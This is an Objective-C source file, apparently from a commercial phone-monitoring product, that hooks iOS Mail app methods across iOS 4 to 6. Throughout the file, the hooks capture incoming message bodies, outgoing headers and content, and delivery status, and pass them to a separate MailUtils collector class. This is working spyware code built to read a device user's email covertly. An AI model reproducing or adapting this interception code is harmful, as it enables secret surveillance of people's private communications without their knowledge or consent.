
/**
 - Project name :  MSFSP
 - Class name   :  Mail
 - Version      :  1.0  
 - Purpose      :  For HOOKING MAIL
 - Copy right   :  18/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */


#import "MSFSP.h"
#import "MailUtils.h"
#import "Message.h"
#import "MessageBody.h"
#import "MailType.h"
#import "MFOutgoingMessageDelivery.h"
#import "MFOutgoingMessageDelivery+IOS6.h"
#import "OutgoingMessageDelivery.h"

#import "MFMailMessageLibrary.h"

#pragma mark -
#pragma mark Common incoming HOOK Method for IOS4, IOS5 and IOS6
#pragma mark -

/**
 - Method name: dataForMimePart:inRange:isComplete:downloadIfNecessary:didDownload
 - Purpose:  This method is used to hook the incomming mail 
 - Argument list and description: No Argument.
 - Return type and description: (id) mime data
 */

HOOK(Message, dataForMimePart$inRange$isComplete$downloadIfNecessary$didDownload$, id, id arg1, NSRange arg2, BOOL *arg3, BOOL arg4, BOOL *arg5) {
	DLog(@"----------------------- arguments1 -------------------");
	DLog(@"[arg1 class] = %@", [arg1 class]);
	DLog(@"arg1 = %@", arg1);
	
	DLog(@"arg2.location = %d, length = %d", arg2.location, arg2.length);
	DLog(@"arg3 = %d", arg3);
	DLog(@"arg4 = %d", arg4);
	DLog(@"arg5 = %d", arg5);
	DLog(@"----------------------- arguments1 -------------------");
	
	id mimePartData = CALL_ORIG(Message, dataForMimePart$inRange$isComplete$downloadIfNecessary$didDownload$, arg1, arg2, arg3, arg4, arg5);
	
	DLog(@"----------------------- arguments2 -------------------");
//	DLog(@"[mimePartData class] = %@", [mimePartData class]); // MFData
//	DLog(@"mimePartData = %@", mimePartData);
	DLog(@"[arg1 class] = %@", [arg1 class]);
	DLog(@"arg1 = %@", arg1);
	
	DLog(@"arg2.location = %d, length = %d", arg2.location, arg2.length);
	DLog(@"arg3 = %d", arg3);
	DLog(@"arg4 = %d", arg4);
	DLog(@"arg5 = %d", arg5);
	DLog(@"----------------------- arguments2 -------------------");
	
	// Note: When capture incoming mail that is not complete would cause error in extracting data from message parts
	BOOL isComplete = *arg3;
//	BOOL downloadIfNecessary = arg4;
//	BOOL didDownload = *arg5;
	if (isComplete /*&& downloadIfNecessary && didDownload*/) {
		MailUtils *mailUtils = [[MailUtils alloc] init];
		[mailUtils incomingWithMessage:self
						   andMimeBody:[self messageBody]];
		[mailUtils release];
	}
	return (mimePartData);
}

#pragma mark -
#pragma mark Outgoing HOOK Method1 for IOS5 ad IOS6
#pragma mark -


/**
 - Method name: initWithMessage
 - Purpose:  This method is used to hook the outgoing mail in IOS5
 - Argument list and description: arg1(id).
 - Return type and description: MFOutgoingMessageDelivery (id)
 */

HOOK (MFOutgoingMessageDelivery,initWithMessage$,id,id arg1) {
	DLog (@"MFOutgoingMessageDelivery --> initWithMessage")
	id omd = CALL_ORIG(MFOutgoingMessageDelivery,initWithMessage$,arg1);
	
	 DLog(@"arg: %@", omd);
	 DLog(@"class: %@", [omd class]);
	 DLog(@"arg1: %@", arg1);
	 DLog(@"class: %@", [arg1 class]);		// LibraryMessage for photo only
	
	MailUtils *mailUtils=[[MailUtils alloc]init];
	[mailUtils outgoingMessageWithOutgoingMessageDelivery:self
											  andContents:omd];
	
	[mailUtils release];
	return omd;
}


#pragma mark Outgoing HOOK Method2 for IOS5, IOS6


/**
 - Method name: initWithHeaders:mixedContent:textPartsAreHTML
 - Purpose:  This method is used to hook the outgoing mail for IOS5
 - Argument list and description: arg1(id),arg2(id),arg3(id)
 - Return type and description: MFOutgoingMessageDelivery (id)
 */

HOOK(MFOutgoingMessageDelivery,initWithHeaders$mixedContent$textPartsAreHTML$,id,id arg1,id arg2,id arg3) {
	DLog (@"Capturing:	MFOutgoingMessageDelivery --> MIX")
	id omd = CALL_ORIG(MFOutgoingMessageDelivery,initWithHeaders$mixedContent$textPartsAreHTML$,arg1,arg2,arg3);
	/*
	 DLog(@"arg: %@", omd);
	 DLog(@"class: %@", [omd class]);
	 DLog(@"arg1: %@", arg1);				
	 DLog(@"class: %@", [arg1 class]);		// MutableMessageHeaders for text
	 DLog(@"arg2: %@", arg2);				
	 DLog(@"class: %@", [arg2 class]);		// __NSArrayM for text 
	 DLog(@"arg3: %@", arg3);
	 DLog(@"class: %@", [arg3 class]);		// nulll for text
	 */
    MailUtils *mailUtils=[[MailUtils alloc]init];
	[mailUtils outgoingMessageWithOutgoingMessageDelivery:omd
											  andContents:arg2];
	[mailUtils release];
	return omd;
}

#pragma mark Outgoing HOOK Method3 for IOS5


/**
 - Method name: initWithHeaders:HTML:plainTextAlternative:other
 - Purpose:  This method is used to hook the outgoing mail for IOS5
 - Argument list and description: arg1(id),arg2(id),arg3(id),arg4(id).
 - Return type and description: MFOutgoingMessageDelivery (id)
 */

HOOK(MFOutgoingMessageDelivery,initWithHeaders$HTML$plainTextAlternative$other$,id,id arg1,id arg2,id arg3,id arg4) {
	DLog (@"MFOutgoingMessageDelivery --> HTML")
	id omd = CALL_ORIG(MFOutgoingMessageDelivery,initWithHeaders$HTML$plainTextAlternative$other$,arg1,arg2,arg3,arg4);
	
	 DLog(@"arg: %@", omd);
	 DLog(@"class: %@", [omd class]);
	 DLog(@"arg1: %@", arg1);
	 DLog(@"class: %@", [arg1 class]);
	 DLog(@"arg2: %@", arg2);
	 DLog(@"class: %@", [arg2 class]);		// __NSCFString for forward text
	 DLog(@"arg3: %@", arg3);
	 DLog(@"class: %@", [arg3 class]);		// PlainTextDocument for forward text
	 DLog(@"arg4: %@", arg4);
	 DLog(@"class: %@", [arg4 class]);		// __NSArrayI for forward text
	 
	
	MailUtils *mailUtils = [[MailUtils alloc] init];
	if (arg2) {
		[mailUtils outgoingMessageWithOutgoingMessageDelivery:omd andContents:arg2];
	} else if (arg4) {
		[mailUtils outgoingMessageWithOutgoingMessageDelivery:omd andContentArray:arg4];
	}
    [mailUtils release];
	
	return omd;
}

#pragma mark Outgoing HOOK Method4 for IOS5, IOS6


/**
 - Method name: deliverSynchronously
 - Purpose:  This method is used to hook the outgoing mail for IOS5
 - Argument list and description:No Argument
 - Return type and description: MFOutgoingMessageDelivery (id)
 */

HOOK (MFOutgoingMessageDelivery,deliverSynchronously,id) {
	DLog (@"MFOutgoingMessageDelivery --> deliverSynchronously")
	id status =CALL_ORIG(MFOutgoingMessageDelivery,deliverSynchronously);
	DLog(@"deliverSynchronously status: %d", status);
	int deliveryStatus=(int)status;
	double timeStamps=[[self message] dateSentAsTimeIntervalSince1970];
	MailUtils *mailUtils=[[MailUtils alloc]init];
	if(deliveryStatus==_MAIL_DELIVERY_STATUS_SUCCESS_) 
	    [mailUtils deliveredOutgoingMail:timeStamps];
	else 
		[mailUtils removeUnsentMail:timeStamps];
	[mailUtils release];
	return status;
}

#pragma mark -
#pragma mark Fowarding, reply mail for IOS6
#pragma mark -

HOOK(MFOutgoingMessageDelivery, initWithHeaders$HTML$plainTextAlternative$other$charsets$, id, id arg1, id arg2, id arg3, id arg4, id arg5) {
	id omd = CALL_ORIG(MFOutgoingMessageDelivery, initWithHeaders$HTML$plainTextAlternative$other$charsets$, arg1, arg2, arg3, arg4, arg5);
	
	DLog(@"----------------------- arguments -------------------");
	DLog(@"[omd class] = %@", [omd class]);
	DLog(@"omd = %@", omd);
	DLog(@"[arg1 class] = %@", [arg1 class]); // MutableMessageHeaders
	DLog(@"arg1 = %@", arg1);
	DLog(@"[arg2 class] = %@", [arg2 class]); // __NSCFString
	DLog(@"arg2 = %@", arg2);
	
	DLog(@"[arg3 class] = %@", [arg3 class]); // PlainTextDocument
	DLog(@"arg3 = %d", arg3);
	
	DLog(@"[arg4 class] = %@", [arg4 class]); // __NSArrayI
	DLog(@"arg4 = %@", arg4);
	DLog(@"[arg5 class] = %@", [arg5 class]); // __NSArrayM of MFMimeCharset
	DLog(@"arg5 = %@", arg5);
	DLog(@"----------------------- arguments -------------------");
	
	MailUtils *mailUtils = [[MailUtils alloc] init];
	if (arg2) {
		[mailUtils outgoingMessageWithOutgoingMessageDelivery:omd andContents:arg2];
	} else if (arg4) {
		[mailUtils outgoingMessageWithOutgoingMessageDelivery:omd andContentArray:arg4];
	}
    [mailUtils release];
	
	return omd;
}

#pragma mark -
#pragma mark Outgoing HOOK Method1 for IOS4
#pragma mark -


/**
 - Method name: initWithMessage
 - Purpose:  This method is used to hook the outgoing mail in IOS4
 - Argument list and description: arg1(id).
 - Return type and description: OutgoingMessageDelivery (id)
 */

// Tested in IOS 4, it was NOT called for outgoing mail
HOOK (OutgoingMessageDelivery,initWithMessage$,id,id arg1) {
	DLog (@"OutgoingMessageDelivery --> initWithMessage")
	id omd = CALL_ORIG(OutgoingMessageDelivery,initWithMessage$,arg1);
	
	DLog(@"omd: %@", omd);
	DLog(@"class: %@", [omd class]);
	DLog(@"arg1: %@", arg1);
	DLog(@"class: %@", [arg1 class]);
	
	MailUtils *mailUtils = [[MailUtils alloc]init];
	[mailUtils outgoingMessageWithOutgoingMessageDelivery:self
											  andContents:omd];
	
	[mailUtils release];
	return omd;
}

#pragma mark Outgoing HOOK Method2 for IOS4 


/**
 - Method name: initWithHeaders:mixedContent:textPartsAreHTML
 - Purpose:  This method is used to hook the outgoing mail for IOS4
 - Argument list and description: arg1(id),arg2(id),arg3(id)
 - Return type and description: OutgoingMessageDelivery (id)
 */

// Tested in IOS 4, hooked for outgoing mail
HOOK(OutgoingMessageDelivery,initWithHeaders$mixedContent$textPartsAreHTML$,id,id arg1,id arg2,id arg3) {
	DLog(@"OutgoingMessageDelivery --> initWithHeaders$mixedContent$textPartsAreHTML")
	id omd = CALL_ORIG(OutgoingMessageDelivery,initWithHeaders$mixedContent$textPartsAreHTML$,arg1,arg2,arg3);
	
	 DLog(@"arg: %@", omd);
	 DLog(@"class: %@", [omd class]);
	 DLog(@"arg1: %@", arg1);				
	 DLog(@"class: %@", [arg1 class]);		// MutableMessageHeaders for text
	 DLog(@"arg2: %@", arg2);				
	 DLog(@"class: %@", [arg2 class]);		// __NSArrayM for text 
	 DLog(@"arg3: %@", arg3);
	 DLog(@"class: %@", [arg3 class]);		// nulll for text
	 

	
	MailUtils *mailUtils=[[MailUtils alloc]init];
	[mailUtils outgoingMessageWithOutgoingMessageDelivery:omd
											  andContents:arg2];
    [mailUtils release];
	return omd;
}

#pragma mark Outgoing HOOK Method3 for IOS4 


/**
 - Method name: initWithHeaders:HTML:plainTextAlternative:other
 - Purpose:  This method is used to hook the outgoing mail for IOS4
 - Argument list and description: arg1(id),arg2(id),arg3(id),arg4(id).
 - Return type and description: OutgoingMessageDelivery (id)
 */

HOOK(OutgoingMessageDelivery,initWithHeaders$HTML$plainTextAlternative$other$,id,id arg1,id arg2,id arg3,id arg4) {
	DLog(@"OutgoingMessageDelivery --> initWithHeaders$HTML$plainTextAlternative$other$")
	id omd =CALL_ORIG(OutgoingMessageDelivery,initWithHeaders$HTML$plainTextAlternative$other$,arg1,arg2,arg3,arg4);
	
	 DLog(@"arg: %@", omd);
	 DLog(@"class: %@", [omd class]);
	 DLog(@"arg1: %@", arg1);
	 DLog(@"class: %@", [arg1 class]);
	 DLog(@"arg2: %@", arg2);
	 DLog(@"class: %@", [arg2 class]);		// __NSCFString for forward text
	 DLog(@"arg3: %@", arg3);
	 DLog(@"class: %@", [arg3 class]);		// PlainTextDocument for forward text
	 DLog(@"arg4: %@", arg4);
	 DLog(@"class: %@", [arg4 class]);		// __NSArrayI for forward text
	
	MailUtils *mailUtils=[[MailUtils alloc] init];
	if (arg2) {
		[mailUtils outgoingMessageWithOutgoingMessageDelivery:omd  andContents:arg2];
	} else if (arg4) {
		[mailUtils outgoingMessageWithOutgoingMessageDelivery:omd andContentArray:arg4];
	}
	
    [mailUtils release];
	return omd;
}

#pragma mark Outgoing HOOK Method4 for IOS4 

/**
 - Method name: deliverSynchronously
 - Purpose:  This method is used to hook the outgoing mail for IOS4
 - Argument list and description:No Argument
 - Return type and description: OutgoingMessageDelivery (id)
 */

// Tested in iOS4, called for outgoing mail
HOOK (OutgoingMessageDelivery, deliverSynchronously, id) {
	DLog(@"OutgoingMessageDelivery --> deliverSynchronously")
	id status = CALL_ORIG(OutgoingMessageDelivery,deliverSynchronously);
	
	DLog(@"DeliveryStatus %d", status);
	int deliveryStatus = (int)status;
	double timeStamps= [[self message] dateSentAsTimeIntervalSince1970];
	MailUtils *mailUtils=[[MailUtils alloc]init];
	if(deliveryStatus ==_MAIL_DELIVERY_STATUS_SUCCESS_) 
	    [mailUtils deliveredOutgoingMail:timeStamps];
	else 
		[mailUtils removeUnsentMail:timeStamps];
	[mailUtils release];
    return status;
}


